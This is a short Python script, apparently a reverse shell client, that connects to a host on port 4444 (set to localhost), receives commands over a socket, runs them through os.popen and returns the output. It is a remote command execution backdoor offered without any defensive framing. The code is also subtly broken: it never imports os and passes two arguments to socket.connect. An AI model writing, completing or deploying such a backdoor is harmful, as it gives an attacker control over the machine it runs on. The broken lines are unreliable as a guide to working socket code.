import sys
import socket


def execute_commands(command):
    """Обрабатывает команды"""
    execute_c = os.popen(command).read()
    return execute_c


def main():
    host = 'localhost'
    port = 4444
    while True:
        try:
            soc = socket.socket()
            soc.connect(host, port)
        except Exception:
            break

        while True:
            try:
                data = soc.recv(1024).decode()
                execute_c = execute_commands(str(data))
                if len(execute_c) == 0:
                    soc.send(''.encode())
                else:
                    soc.send(execute_c.encode())
            except Exception:
                break
    
    soc.close()


if __name__ == "__main__":
    main()
